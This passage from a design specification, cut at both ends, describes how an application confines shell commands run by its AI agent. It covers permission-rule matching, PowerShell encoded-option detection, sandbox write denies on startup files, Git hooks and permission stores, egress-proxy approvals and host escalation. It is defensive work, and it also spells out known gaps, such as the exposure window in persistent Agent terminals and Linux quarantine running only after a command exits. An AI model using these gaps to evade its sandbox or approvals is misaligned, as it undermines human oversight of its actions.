module, stdin, interactive and other runtime modes remain unproven.

Shell rules are dialect-scoped: `Bash(...)` rules match bash and
`PowerShell(...)` rules match PowerShell (owner decision 2026-10-25), each at
user, project or session scope. Exact command rules preserve every literal raw
word, including the complete program token, module qualifier, case, quote style
and contents. Only whitespace between words is normalized. No command head or
argument is unquoted, requoted, case-folded, basename-collapsed or value-converted
for exact identity. Thus `Alpha\Invoke-Probe` and `Beta\Invoke-Probe`, case
variants, `Write-Output '0x10'` and `Write-Output 0x10` are distinct keys.
Module/basename/case normalization belongs only to detection, effect analysis
and conservative deny/ask matching, never exact allow keys.

Fresh shell allows, including session rules, record `shellRuleVersion: 1`,
owned by `SHELL_RULE_CANONICAL_VERSION` in
`src/shared/shell-rule-version.ts`. Unversioned and wrong-version shell allows
remain silently inert in all scopes. Reads and unrelated writes preserve them
without stamping a current version. There is no migration, new error,
invalid-rule marker or UI flow for these rows. Lost old quote provenance is not
reconstructed; a fresh user-authored rule is required to grant current-format
authority. Deny and ask rules retain their narrowing authority regardless of
version.

Applicable exact, prefix and other shell rules retain deny-before-ask-before-allow precedence under the [decision tree](permission-decision-tree.md). Rule matching never supplies static proof. Host-shell execution and escalation use ordinary mode/human routing; there is no separate exact-only host-shell authorization matrix.

PowerShell launcher detection checks the whole command, including launcher
names inside quoted strings and across pipelines or sequences. Once a launcher
word is seen, every later token must pass a positive character proof after shell
quote removal: each code point must be a Unicode letter, number, punctuation,
symbol, or U+0020 ASCII space. Other separators, controls, combining marks and
unassigned code points make the command unproven. Hangul letters remain literal.
This proof does not infer an argument binder's whitespace behavior.

Only tokens that pass the character proof receive the deliberate encoded-option
overmatch: remove leading ASCII hyphens, slashes and U+2013/U+2014/U+2015 dashes,
then lowercase; an e-leading result is unproven. Thus `-ExecutionPolicy` also
asks. The scan never stops at `-File`, `--` or quoted separators, requires no
operand, and uses no wrapper list or recursive dialect parser. Module/basename,
executable-extension and case normalization are detection-only. Visible literal
file/stdin/network indirection for a simple invocation otherwise remains
eligible under the static contract above; runtime argv production remains
unproven. Literal evaluation payloads retain their limited opaque-payload
evidence; other dynamic forms remain unproven.

PowerShell cmdlet argv uses its own closed parameter grammar. Unsupported
parameters, including non-ASCII dash spellings, are unproven. The registered
HTTP cmdlets mark a possible write only when the recognized `-OutFile` parameter
is present; their credential and upload floors remain independent. This argv
proof is separate from the launcher-wide encoded-option character proof above.

The Lane A heredoc data allowance requires every heredoc operator in the whole
original command to have a quoted delimiter, including `<<'X'`, `<<"X"` and
`<<\X`. One unquoted delimiter cancels the allowance for every body. In that
case, all text after the first heredoc operator's line receives the normal
literal checks and the command remains within the normal 8,000-character cap.
Plain unquoted bodies without expansion remain eligible through those checks.
Body extent comes from analysis of the original source: no body is deleted, no
remaining text is reparsed as proof, and no separate line-continuation reader is
used. Unsafe or ambiguous syntax fails closed.

Quoted bodies also require no known code-consuming receiver. The single static
pass identifies those receivers without inspecting body contents. Known consumers
remain unproven and keep the 8,000-character cap;
an unknown receiver or receiver grammar is also unproven. Literal data writes
remain eligible only when the receiver's registered grammar consumes every
argument. Aggregate data body bytes stay within 64 KiB and the executable
envelope within 8,000 characters. Eligible bodies are retained as original
source slices and scanned only to locate terminator lines, never for general
code/floor inspection. Lane B always caps the complete original command at
2,000 characters.

Each permission request obtains one lexical representation from the original
grammar and performs one static pass. Literal token facts, index-range argv views
and stored-rule parses are reused within that request. Successful analysis is
not cached across requests. The default positive argv proof is owned by
`src/permissions/rules/shell-argument-grammar.ts`; sealed native plans extend it
through the verified executable contract above. Unknown commands and grammar
remainders do not fall back to a negative-danger scan. The grammar counts
executable word/value records across the entire input, including nested commands
and assignment values, against the 400-record `MAX_SHELL_ANALYSIS_TOKENS` limit in
`src/shared/shell-analysis-limits.ts`. Empty assignments and declaration heads
also contribute records; literal quoted body data does not. It refuses
over-limit input before expensive result serialization. The cap is global;
there is no separate per-command word allowance. Separators and operators are
bounded by the character cap. General structural parsing retains its existing
safety limits.

Quoted literal data is retained as an original source slice. The lexer scans
it only to locate its terminator lines; it does not turn body contents into
ordinary words, run launcher detection over them, or include them in the
executable-token count. Unquoted or mixed heredocs keep the normal analysis
path. No host-side shadow lexer predicts grammar work or body extents.

Floor inspection reuses request-local canonical-path results and catalogue
matches for literal operands. The decision has no work counter, elapsed-time
cutoff or worker timeout as an authority input. Diagnostic counters may assert
linear work in tests but cannot affect a verdict. Admission
is bounded by the character, data and total-token limits; timing checks are
regression tests and have no production decision authority.

The sink catalogue remains a host policy floor, including for unsandboxed
commands. The [shell sandbox policy](#os-shell-sandbox-policy) owns the OS
boundary and proxy approval contract. Classification evidence alone does not
prove native confinement or egress enforcement.
The [implementation design](../design/permissions-always-allow-and-judge.md#shell-classification-buckets)
records the retained credential and sink coverage. The guest risk grading below
is a separate contract.

## Shell Execution And Explicit Host Approval

### OS shell sandbox policy

This policy applies to builtin Bash and PowerShell tool invocations. Workspace
PTYs retain the [terminal policy](#commands-typed-into-a-workspace-terminal),
including their own attributed domain approvals and socket policy.
The user terminal's host shell is a separate surface.

`features.osToolSandbox` defaults to `true` on macOS and Linux. Windows remains
explicitly default-off until its shell confinement gate is enabled. Loading
settings preserves an explicit stored `true` or `false`; the platform default
applies only when the value is absent. A setting expresses activation intent,
while successful capability probing establishes availability. Unavailability
has a machine-readable reason and is logged once for the activation attempt.
An explicit `AVE_SANDBOX_ENABLED=1` request aborts startup on macOS and Linux
if activation fails. Settings/default activation instead warns and continues
without OS isolation; Windows also warns and continues when unavailable.

The existing host-issued
[`HostShellExecutionPlan`](../../src/permissions/host-shell-execution-plan.ts)
is the invocation's source of execution state. Its `sandboxed` field is true
only when the sandbox is enabled, the capability probe passed and the selected
command will use the verified confined shell route. `executionMode: "host"`
requests and unavailable confinement carry `sandboxed: false`; any excluded
command or retry that runs outside confinement must use that same state.
The field participates in the plan's audit projection and
cache identity. Permission consumers receive the plan before deciding; neither
a renderer flag nor a process-wide capability can establish that a particular
command will run sandboxed. This state contract does not redefine command-rule
matching or approval precedence.

A failed native filesystem sandbox attempt may have partially changed state. Only a host-branded, per-command attributed filesystem denial bound to the exact command and cwd can request escalation. The executor creates a distinct host invocation, reruns admission/rules/floors/mode/review and obtains any required normal approval before a single host effect. The card warns that the first attempt may have partially executed. No host replay occurs on cancellation, timeout, a newly applicable deny or a mismatched command. A headless ordinary request reviews first in auto; a human fallback denies with no-retry guidance.

Stderr text, copied/serialized evidence, arbitrary metadata, unrelated native records and plugin/MCP results cannot mint escalation authority. Trusted native filesystem-denial attribution is currently supported only by the macOS monitor. The installed Linux monitor reports diagnostic attempts that are deliberately rejected as escalation authority; Windows also supplies no trusted record for this bridge. On those paths the original failure remains. The controlled executor tests exercise policy orchestration with issued evidence and do not demonstrate native Linux attribution. Worker capability grants and native protected-path denies are not relaxed in place; the host request is a fresh decision for a distinct execution plan. See the [executor escalation tests](../../src/tools/__tests__/executor-sandbox-escalation.test.ts) for request/result identity and effect-count coverage.

Host-shipped JavaScript scripts use the [host runtime descriptor](../../src/main/host-script-runtime.ts), exposed as `javascriptRuntime` and `bundledScriptsDirectory` in the model's **Application paths (JSON)**. With `ELECTRON_RUN_AS_NODE=1`, only the exact host runtime and a verified direct first script operand receive read roles. The script must be a direct bundled CommonJS file matching the build manifest's SHA-256; arbitrary interpreters, traversal/namespace aliases and later data operands receive no such exemption. Workbook/request paths and redirections still pass ordinary path policy, permission and approval gates. Runtime directory reads are bound only for the admitted runtime/script pair, add no write roots and do not pierce protected read floors. The host script directory is write-denied in both host policy and native confinement, including beneath an admitted workspace. User-shadowable skill instructions cannot supply these trusted paths. The [workbook editing design](xlsx-skill-editing.md#execution-and-delivery) owns its script delivery and command examples.

Sandbox writes are limited to the invocation's admitted project roots and
temporary directories. Mandatory write denies protect these entries beneath
each admitted write root, taking precedence over grants:

- `.bashrc`, `.zshrc`, `.profile`, `.bash_profile` and `.zprofile`;
- `.gitconfig` and the repository control paths defined below;
- `.vscode/**`;
- `.envrc`, `.mise.toml`, `mise.toml`, `.tool-versions`, `.npmrc`, `.yarnrc.yml`,
  `bunfig.toml` and `.husky/**`;
- configured `core.hooksPath` directories, including absent targets and their
  physical symlink targets;
- Ave settings, permission settings, rules, policies and approval grants, with
  paths derived from their owning stores rather than copied filenames.

The Windows MXC PowerShell container receives the same denies from the same
policy builder: an existing protected entry inside a write grant becomes
read-only and an absent one is denied, so it cannot be created.

Loader denies apply to isolated processes through the common filesystem policy,
including the persistent conversation shell and worker confinement when enabled.
They do not interpose on commands the user types into a host terminal. Existing
loader trust prompts remain independent of these write denies. Hook discovery
reads bounded regular configuration files without running repository programs.
It includes repository ancestry, linked-worktree/common configuration, inherited
home/XDG/system configuration and explicit configuration-file environment
overrides. Conditional includes are conservatively included regardless of their
current condition. Configuration sources, include sources, configured hook
directories and physical aliases remain protected; relative hook paths cover
both the worktree and metadata working directories. Unsupported path interpolation,
named-home expansion, invalid escapes and exhausted read/include budgets refuse
policy preparation instead of leaving an unknown target writable. Conventional
system locations and explicit overrides are inspected; custom compiled-in system
configuration prefixes require an explicit system-config override. The Unix
loader paths retain creation protection on Linux rather than using its special
Git-metadata quarantine exception.

The existing sensitive-write floor owns real-home startup-file protection; the
root-relative policy does not maintain a second real-home filename list.
Denies cover creation when a protected path does not yet exist, as well as
modification of existing content, except for the Linux Git metadata policy
below. Linux mounts only existing Git controls and quarantines newly created
controls after the invocation. Startup-file and application-store denies retain
their existing creation protection. The
[write policy](../../src/permissions/sandbox-write-policy.ts) retains both a
protected entry and its canonical target when it is a link. An existing regular
`.git` pointer file remains write-denied. Its resolved metadata directory and linked
worktree common directory receive the same control-path protection, including
the `gitdir` and `commondir` records that could redirect later discovery.
Ordinary data in those directories is writable only when already admitted;
resolving a pointer grants no new write root. Controls remain protected when their
targets are outside the current write grants. Metadata discovery reads regular
files without executing a command. Symbolic `.git` markers refuse preparation;
directory-link traversal stays within the admitted root's canonical tree.
Derived metadata paths containing pattern characters remain literal paths;
macOS denies include absent targets, while Linux Git deny mounts require an
existing entry. Reads have limits of 64 KiB per file and 1 MiB
across the invocation. Exceeding either metadata limit refuses preparation.
Metadata must round-trip as UTF-8; only terminal CR/LF delimiters are removed,
so spaces, tabs and nonbreaking spaces remain path data. Physical resolution
follows links before parent components and preserves filesystem spelling.
Metadata routing inspects at most 64 components; missing-path resolution is
bounded at 64 ancestors. On macOS, existing routing links receive literal
entry pins.
On Linux, the same bounded inspection covers mandatory control paths and
the existing sensitive-write floor, whose paths still come from their owning stores.
A bind mount follows the link instead of protecting its directory
entry, so every write grant containing the routing link's parent is removed.
Independent child and sibling grants remain; an ordinary write grant on that
same parent cannot coexist with this protection. Non-Git sensitive-write
protection can also protect the first missing component of a missing target.
An unresolved parent component beyond a missing ancestor refuses preparation.
Linux does not replay routing links as deny binds; target denies remain with
their existing owners so a link cannot mask an unrelated target subtree.
Symbolic `.git` marker entries refuse preparation; linked worktrees use
regular pointer files.
Unexpected discovery failures fail closed, either by refusing preparation or
removing the affected root's write grant rather than trusting partial results.
`buildMandatorySandboxWritePolicy` returns the retained `allowWrite` roots and
mandatory `denyWrite` entries in the existing filesystem configuration. The
[sandbox wrapper](../../src/permissions/asrt-sandbox.ts) composes these denies
with the existing sensitive write floor for each invocation. Store-owned paths
come from the [application settings store](../../src/data/settings-store.ts),
[permission settings store](../../src/permissions/permission-settings-store.ts),
[global rule store](../../src/permissions/rules/rule-files.ts) and
[project rule store](../../src/permissions/rules/project-rule-files.ts).
The same boundary covers policy files and saved permission and egress grants.
Relocation of a store must relocate its protection too. A command cannot
rewrite its own settings, rules or exclusions through a broader grant.

#### Repository metadata

An existing `.git` directory is writable within an admitted root. Git can update
objects, refs, the index, `HEAD`, logs and `COMMIT_EDITMSG`, so ordinary commit,
branch, stash and merge operations can run inside confinement. The sandbox
continues to protect configuration, executable hooks and discovery records.
In the table, a protected entry is denied on macOS even when absent. On Linux,
an entry present during preparation is deny-mounted; an entry absent then may
be created during execution and is quarantined after confirmed exit:

| Path relative to a repository metadata directory | Write policy |
| --- | --- |
| `hooks/**`, `config`, `config.worktree` | Protected configuration and executable hooks. |
| `modules/**/hooks/**`, `modules/**/config`, `modules/**/config.worktree` | Protected submodule controls, including future entries where backend patterns apply. |
| `worktrees/*/config.worktree`, `worktrees/*/commondir`, `worktrees/*/gitdir` | Protected linked-worktree configuration and discovery. |
| `commondir`, `gitdir` and a checkout's regular `.git` pointer file | Protected routing entries, including already resolved control targets. |
| `objects/info/alternates`, `objects/info/http-alternates` | Protected object-store paths and alternate URLs. |
| `remotes/**`, `branches/**` | Protected legacy remote URL and refspec definitions; these are configuration-equivalent routing inputs. |
| `info/attributes` | Linux protects this control; macOS retains writable attributes as described below. |
| `objects/**`, `refs/**`, `index`, `HEAD`, `logs/**`, `COMMIT_EDITMSG` | Writable subject to the control-path exceptions. |

A `.git` entry absent when a command is prepared remains blocked from creation
on macOS. Repository initialization and cloning there require the existing
[explicit host execution route](#shell-execution-and-explicit-host-approval).
A protected-path failure reports: "`.git` metadata is protected; rerun outside
the sandbox after approval". The caller must submit `executionMode: "host"`
with a justification for that exact action; no automatic unsandboxed retry,
parallel approval path or lasting sandbox disable is introduced. Metadata
protection does not change command-rule interpretation.

On Linux, an absent `.git` entry is not a deny-mount target. Initialization or
cloning can create it inside the current invocation; successful post-exit
quarantine moves the new marker or metadata directory out of the write root
and reports where it can be restored. It is temporary access during that
invocation, not a persistent repository grant. Existing repositories retain
ordinary object, ref, index and `HEAD` writes without creating absent routing
files as mount points: a missing `commondir`, for example, remains absent when
Git reads it.

The additional-file audit follows the
[repository layout manual](https://git-scm.com/docs/gitrepository-layout#_description).
`info/` is not denied as a whole. `info/exclude`, `info/sparse-checkout`,
`info/refs` and `objects/info/packs` contain patterns or repository data rather
than command definitions. `info/grafts` changes apparent ancestry, like
writable replacement refs, and is not treated as code or configuration
injection. On macOS `info/attributes` remains writable: an attribute selects a
driver, while its clean, smudge, process, merge or diff command must already be
defined in configuration. The
[attribute manual](https://git-scm.com/docs/gitattributes#_filter) documents this
separation; existing trusted drivers can still run when selected. Linux treats
`info/attributes` as a protected control: an existing file is denied, and a new
file is quarantined after execution. This limits persistence of a new driver
selection without claiming that it cannot run during that invocation. Alternates
are protected for routing integrity, without claiming that their contents are
executable commands. The [fetch manual](https://git-scm.com/docs/git-fetch#REMOTES)
documents the legacy `remotes/` and `branches/` files as alternatives to remote
configuration. Their URLs can select transport helpers, so those subtrees are
protected alongside configuration.

The policy intentionally differs across the referenced implementations:

| Property | Ave policy | Reference behavior |
| --- | --- | --- |
| Existing metadata directory | Permit ordinary Git writes; deny controls. | The [runtime at `c66fb77`](https://github.com/anthropic-experimental/sandbox-runtime/blob/c66fb77/src/sandbox/sandbox-utils.ts#L39-L49) permits `.git`; its [macOS builder](https://github.com/anthropic-experimental/sandbox-runtime/blob/c66fb77/src/sandbox/macos-sandbox-utils.ts#L126-L133) denies hooks and conditionally config. |
| Whole-directory protection | Existing `.git` directories remain writable. | The [permission builder at `970111f`](https://github.com/openai/codex/blob/970111f/codex-rs/protocol/src/permissions.rs#L2360-L2380) protects an existing top-level `.git` and resolved pointer target; its [Seatbelt matcher](https://github.com/openai/codex/blob/970111f/codex-rs/sandboxing/src/seatbelt.rs#L591-L603) covers protected names and descendants. |
| Nested controls | Case-insensitive macOS patterns at any depth; bounded Linux scan before every command. | The [Linux builder at `c66fb77`](https://github.com/anthropic-experimental/sandbox-runtime/blob/c66fb77/src/sandbox/linux-sandbox-utils.ts#L537-L566) scans per command and uses `.git/HEAD` to identify nested repositories. |
| Missing `.git` | macOS creation denied; Linux creation allowed during the invocation, then recoverable quarantine. | The pinned [Linux marker handling](https://github.com/anthropic-experimental/sandbox-runtime/blob/c66fb77/src/sandbox/linux-sandbox-utils.ts#L408-L427) leaves an absent marker unmounted. |
| Bare layout in a non-repository root | macOS prevention; recoverable Linux post-command quarantine plus host Git hardening. | The [protected-path documentation](https://code.claude.com/docs/en/sandboxing#protected-paths) describes top-level bare-layout protection and Linux cleanup. Ave preserves moved entries for recovery. |

#### Bare layouts and host Git

For each write root outside a repository, macOS denies top-level `HEAD`,
`objects`, `refs` and `config`; it also denies `hooks` when `HEAD` already
exists. Linux does not bind-mount missing bare-layout entries, because doing
so would create host files. Before each invocation it classifies the roots and
snapshots which of these entries are absent. After exit it quarantines newly
appeared `HEAD`, `objects`, `refs` and `config`, including nonempty contents;
it also quarantines a newly appeared `hooks` when `HEAD` is present at cleanup.
Pre-command entries are preserved, and a changed root identity prevents moving
through a substituted root. Absence at preparation does not prove which
process created an entry: a concurrent editor or user terminal can create a
reserved name that this sweep then moves. Quarantine preserves that entry
instead of deleting potentially unrelated work. It is a post-command response,
not a write denial while the process runs.

The shared quarantine helper uses Ave's private `sandbox-quarantine` feature
namespace and a unique timestamped slot for each invocation. Each entry moves
by atomic rename on the same filesystem, using the shared atomic staging
helper. A symbolic link moves as a link; its target is never followed.
Cross-device or other rename failures are logged and fail clearly without a
copy or delete fallback. Earlier successful moves remain recoverable if a
later move fails. The existing result annotator and terminal output carry a
notice listing each original path and its quarantine destination, with an
instruction to inspect the entry and move it back to its original path when
restoring it. The tool result includes the notice. Quarantine failures make an
otherwise successful shell result an error with `sandboxCleanupFailed`
metadata. A post-spawn process error can return before child termination; its
later quarantine outcome is logged after exit rather than changing that
already returned error result.

The Linux sweep also covers newly appeared Git controls within the bounded
discovery area, including repositories created without a `HEAD` yet and
submodule and linked-worktree controls. A new or replaced marker entry is
quarantined as a whole, as is a previously resolved metadata store that was
absent at preparation and materialized during execution. Newly encountered
submodule and private-worktree stores are also quarantined as whole entries
before their new routing records can select cleanup targets. The sweep reuses
the metadata/control discovery rules and already resolved stores captured
before execution, restricted to the final effective write roots. Read- or
write-denied control subtrees are excluded from cleanup. It preserves
pre-existing entries and does not trust a replaced marker or follow a new
routing pointer, symbolic link or ordinary directory link to choose arbitrary
cleanup targets. Initially trusted directory links retain their captured
physical route. Resolving an external store does not authorize quarantining
controls the command could not write. For a previously unresolved trusted
store, cleanup moves its newly appeared first missing ancestor as an entry;
a new routing link never selects the linked target for relocation. Quarantine
does not roll back other data writes permitted during the invocation.
If moving an entire marker or store
would include a protected descendant, cleanup fails visibly and retains its
hold rather than moving protected state.
Preparation also refuses deny patterns that cleanup cannot represent safely,
including character classes and patterns combining POSIX backslashes with
wildcards. It never treats an unsupported pattern as a successful empty sweep.
An incomplete cleanup scan or exceeded budget reports failure rather than
claiming that all new controls were quarantined. These guarantees describe a
successful post-exit sweep: controls can be visible during execution, and
concurrent processes or a failed sweep can observe or leave them in place.

Every Ave-owned Git subprocess uses the shared argument builder in
[host-git.ts](../../src/shared/host-git.ts), including marketplace operations,
ignore queries, runtime admission and version probes. It supplies `safe.bareRepository=explicit`,
`core.fsmonitor=false` and a neutralized `core.hooksPath` on each invocation,
while retaining the caller's environment, credential and transport gates.
Hooks may be enabled only by an explicit caller policy for a demonstrated
requirement. Sandboxed agent commands and user-entered terminal commands do
not acquire host authority through this helper.

Linux invocation preparation also registers canonical retained write roots
with `holdSandboxGitWrites` after taking its metadata snapshot and before
spawning the child. The shared `isHostGitWorkspaceAvailable` check defers
queries in overlapping roots, including ancestor or descendant workspaces;
independent siblings remain available. The synchronous project-instruction
`check-ignore` host service reads user-project metadata. While a hold is active,
it returns its conservative "not ignored" answer without spawning Git or
memoizing that temporary answer. Future Ave-owned callers that read
user-workspace Git metadata must use the same availability check as well as the
shared argument builder. These separately governed host services supply no
shell-classifier Git proof or user-tool admission.

The invocation releases its hold only after quarantine succeeds. A failed
cleanup retains the hold for that host process's remaining lifetime, deferring
the coordinated query when its checkout root overlaps a held root.
Overlapping invocations have independent holds; releasing one does not release
another. Holds compare canonical checkout-root paths; they do not track every
checkout-to-gitdir or commondir relationship. A sibling checkout whose root
does not overlap a hold can still query a changed external metadata store
shared with a held workspace. This is ordering within the current Ave process,
not filesystem isolation for arbitrary Git processes. It neither persists across a host crash
or restart nor cancels Git work already running before the hold. External
editors, user terminals and other processes can still observe newly created
controls during execution or after failed cleanup. The shared Git flags do
not neutralize every configured filter or helper.

The [safe configuration documentation](https://github.com/git/git/blob/7e34d8174dcda3435d1404c9a30bef46afe6c13e/Documentation/config/safe.adoc)
explains that `explicit` refuses implicitly discovered bare repositories while
permitting an explicit `--git-dir` or `GIT_DIR`. The
[breaking-change rationale](https://github.com/git/git/blob/7e34d8174dcda3435d1404c9a30bef46afe6c13e/Documentation/BreakingChanges.adoc#L219-L241)
describes how a planted bare repository can make even a status query execute a
configured monitor. The [core configuration manual](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath)
documents per-command hook neutralization.

IDE integrations and user terminals run their own Git processes and do not
inherit Ave's host helper. A Linux command can expose a planted layout before
quarantine, and forced host termination can prevent the sweep altogether. Recommend
`git config --global safe.bareRepository explicit` for those independent
clients, as recommended by the safe configuration documentation. The setting
does not disable an already configured filter, credential helper or other
trusted command in a normal repository. Linux quarantine limits persistence of
new controls after a successful sweep; it does not make all Git configuration
inert or prevent its use during execution.

#### Preparation and native validation

On Linux, a missing Git control is omitted from deny mounts so preparation
does not manufacture an empty marker, configuration file or routing record on
the host. The carried Linux runtime patch applies this rule to its cwd and
nested mandatory Git candidates as well. The sensitive-write and application-store
protection owners remain
unchanged. Their absent-path protection can still require temporary mount
points. Normal mount-point cleanup is limited to ownership-checked empty
entries; abrupt host termination, including SIGKILL or OOM termination, can
leave residue. Successful normal cleanup does not prove crash cleanup.
Recovery must preserve unrelated, replaced or nonempty paths.

On Linux, nested repositories are discovered beneath admitted roots before every
sandboxed command, through directory depth three with the root at depth zero:
`a/b/c/.git` is included. Each root's own protected entries are denied
independently of this scan. Discovery ignores ignore-file rules and skips
`node_modules`, `.git`, `.hg`, `.svn`, `.venv`, `venv`, `vendor`, `dist`,
`build` and `.cache` trees. All roots share one invocation budget of 16,384
directory entries. Canonical roots are scanned from narrower roots to their
ancestors. Root bindings are captured once and retained grants use those
canonical identities, so retargeting an alias cannot grant an unscanned target.
Actual grants preserve physical Unicode and POSIX backslash spellings; matching
normalization cannot grant or deny a different physical sibling. macOS also
walks beyond depth three, including dependency/build and Git metadata trees,
to resolve existing regular pointer files and refuse symbolic `.git` markers.
Patterns alone cannot protect an arbitrary canonical target of an existing
deep marker. This walk has the same shared budgets; an incomplete walk removes
the containing write grant. A large dependency tree can therefore make a broad
macOS project grant read-only; independently admitted narrower roots can survive.
Incomplete enumeration, an exhausted entry budget or more than
16 KiB of discovered metadata and routing-pin path bytes for that root removes
its write grant.
Containing ancestor grants are also removed so they cannot reopen a failed
child; independently scanned narrower roots keep their grants when a broader
root is removed. Required metadata denies remain explicit outside the roots
and above retained child grants. If the final serialized write-deny
policy cannot fit within 32 KiB, preparation fails clearly.
When discovery narrows write access, the existing tool result and terminal
output identify the scan limit or failure, the removed roots and the actual
retained write roots. A project too large to scan therefore produces an
explicit reason for narrowed access before a later filesystem permission error.
On macOS, case-insensitive backend patterns additionally protect nested Git
controls at any depth, including future entries. Typed exact-entry Seatbelt
rules protect marker creation and regular pointer-file writes without denying
an existing directory's children. Linux uses `.git/HEAD` to classify repository
and non-repository roots; discovery also inspects controls in partial `.git`
directories without `HEAD`. It uses literal discovered controls and re-scans
on each command rather than retaining one wrapper's scan. Newly created
repositories within the discovery bounds are
handled by the post-exit quarantine sweep, not by mounts added to a running
process. Deliberately skipped or deeper directories remain outside the Linux
discovery coverage. This distinction must remain explicit in validation.

Here a command means a new sandboxed process invocation through the wrapper.
A persistent workspace PTY receives its OS profile when it starts; later blocks
typed into that same process do not re-enter wrapper preparation or replace its
existing Linux mounts. The unprivileged sandbox has dropped the capabilities
needed to remount them, and the host wrapper has no live mount-update API.
Shell-owned prompt or OSC markers cannot establish a reliable enforcement
boundary: foreground code can emit them, background jobs can keep running, and
raw terminal input does not pass through `terminal_run`. A post-block check
cannot establish that a control file was not used before that check.

Before each agent-typed command on Linux, the host re-scans the effective write
roots and compares controls with the identities captured for that terminal's
initial profile. New controls, replaced markers or directory links, or a scan failure
refuses typing through the existing unverified-directory error path and asks
the caller to close and reopen the Agent terminal. The baseline never advances
without creating a fresh sandbox profile. Adding an authorized project outside
the original write grant does not make it writable in the old shell.

Repository metadata appearing after the last check inside an existing Agent
write grant still has an exposure window from its appearance until that Agent
shell exits. There is no time limit while the shell remains alive: foreground
commands and background descendants can use it before the next check, and raw
terminal input does not run that check. Reopening the Agent terminal creates a
fresh profile and scans the metadata then present. Startup and terminal replay
output, and every terminal tool result, carry an explicit notice describing the
window and the need to reopen after metadata changes. This is a visible
limitation, not a claim of per-block prevention or post-block quarantine. Fresh
shell invocations retain the per-command rescan described above.

A very large ambient root, such as the shared temporary directory, may
therefore lose its broad write grant. An explicitly admitted working directory
or private invocation temporary directory remains writable when its narrower
scan succeeds. These bounds do not change command-rule or approval semantics.

Native control-write, repository-metadata and socket regression tests require
working isolation on macOS and Linux, with ordinary write or connection
positive controls. Missing dependencies or failed initialization fail those
tests. Windows skips explicitly. Local runs may explicitly opt out with
`AVE_SKIP_NATIVE_SANDBOX_TESTS=1`; CI does not honor that opt-out. Generated
wrapper arguments alone do not establish native enforcement.

#### Reads, network and status

Reads remain broad. This policy adds no sandbox read denies and preserves
existing read protections, including the [saved-session projection](#saved-session-reads).
The host sensitive-path floor and other mandatory host gates retain authority
even for a sandboxed command.

Sandboxed shell network traffic must pass through the local egress proxy.
The shell domain allowlist starts empty; plugin-declared domains do not seed
it. An unknown destination invokes the host approval callback and the existing
approval dock, offering allow once, always for this destination, or deny when
the destination can hold a persistent grant. Allow once covers that host and
port for the current shell invocation. Always persists the destination through the
[egress grant store](../../src/permissions/egress-grants.ts), so later matching
requests can proceed without another ask. Grants retain the destination's
network class and shell origin; they do not authorize plugin or terminal
traffic. Persistent scopes require verified public destinations and sufficient
invocation attribution. Local or private-network and unverified destinations
offer only allow once or deny; reserved destinations remain denied. The store
retains other scopes for its existing consumers, but builtin shell prompts
offer only once and always.
Deny, approval failure and timeout return a clear network access error to the
command without opening egress.
Headless and auto-mode requests use the same configured permission reviewer
and escalation path as other asks. Direct sockets cannot bypass the proxy.
Unix-domain sockets are denied for shell commands by default; plugin worker
control channels do not grant shell access to those sockets.

When shell confinement is inactive because the setting is off, the runtime is
unavailable or the platform is unsupported, the chat header and Settings show
a persistent, non-dismissable sandbox-off status and localized reason. The
status reports effective shell confinement, including a platform that can
confine plugins but cannot confine shell commands. Session approval does not
change sandbox activation for later commands.

### Route-neutral execution foundation

Shell authorization and execution location are separate decisions. The
route-neutral contract in
[execution-router.ts](../../src/permissions/execution-router.ts) defines three
possible substrates:

| Route | Intended boundary | Current availability |
| --- | --- | --- |
| `workspace-sandbox` | OS-enforced workspace-scoped shell | Mapped from a full ASRT shell plan. |
| `disposable-container` | Disposable Linux guest | Available through either strict same-process operator attestation or the host-native workload broker. These are distinct authorities. |
| `host` | Current-user host shell | Mapped from a legacy plain-shell plan. Existing approval rules remain authoritative. |

The Host hashes the normalized request into an immutable `EffectEnvelope`,
issues a generation-bound `ExecutionCapability`, and produces an immutable
`ExecutionPlan` with the chosen route, decision and fallback. Raw command text
does not enter the route projection. Stable identities cover the effect digest,
cwd, unresolved requirements, runtime limits, capability generation and final
decision, so a changed request or capability generation cannot reuse the same
identity. Structural lookalikes are not host-issued capabilities, plans or
grants.

`workspace-sandbox` requires the issued legacy plan to declare both filesystem
and process confinement as `true`; an omitted legacy `confines` field is not
treated as full confinement by the route-neutral layer. The capability
generation is captured with the legacy plan at issuance and must match the
route capability. A later sandbox generation cannot be paired with that stale
plan, and a grant cannot be issued after its generation becomes stale.

The legacy `HostShellExecutionPlan` still supplies workspace-sandbox and
plain-child mechanics. Without a workload broker, the router orders a full
workspace sandbox first, a live operator-attested disposable guest second, and
an unconfined host last. An active workload broker is exclusive: it advertises
only `disposable-container`, so a broker outage or rejected capability cannot
become local execution.

After normal authorization, each disposable invocation receives an immutable
one-shot `ExecutionGrant`. A shell grant binds the final command, resolved cwd,
runtime limits, legacy plan and capability generations. A canonical-file grant
binds the exact host-created tool instance, schema-normalized input, guest cwd,
broker identity and generation. The consumer checks object identity, route,
effect digest and current generations, then consumes the grant once. Missing,
forged, replayed, mismatched, expired or stale grants fail closed. Audit metadata
records the chosen route and a public-safe capability projection.

Shell path results distinguish a hard policy boundary from an
`analysis-uncertain` requirement. An uncertain default request may not select
the host route automatically. The same-process operator-attested route can
satisfy dynamic, recursive and guest path-boundary uncertainty, but it retains
the host shell grammar, structural and sensitive-path checks before spawning in
that already-confined process.

#### Recursive PowerShell traversal

Two classifiers answer different questions about PowerShell traversal:

- **Definite** ([powershell-recursive-traversal.ts](../../src/shared/powershell-recursive-traversal.ts)):
  the command certainly walks a tree. It covers:
  - a `-Recurse` or `-Depth` name prefix on a filesystem cmdlet that takes one.
    A colon-bound dynamic value counts as enabled; only a literal false does
    not;
  - Get-ChildItem's `-s`;
  - the robocopy/xcopy/findstr recursive switches;
  - archive creation that reads an operand tree (below).

  Measured runtime binding in PowerShell 5.1 and 7 resolves `gci -d 1 src` to Depth, while `-ad` and `-Directory` remain flat directory filters.
  The filesystem cmdlets with recursion parameters are Copy-Item and Remove-Item
  (`-Recurse`), and Get-ChildItem (`-Recurse`, `-Depth`). Prefixes bind against
  that cmdlet's parameters, with declared parameters taking precedence over
  common and provider parameters; an ambiguous prefix alone is not traversal.
  Native recursive switches include findstr's `/s` (bundled, as in `/si` or
  `/s/offline`, or dash-prefixed),
  xcopy's `/s`, `/e`, `/t` (slash prefixes only; a bundle such as `/s/m` or
  `/se` counts whatever its other letters; the named `/exclude`, `/compress`,
  `/[-]sparse` and `/noclone` do not), and
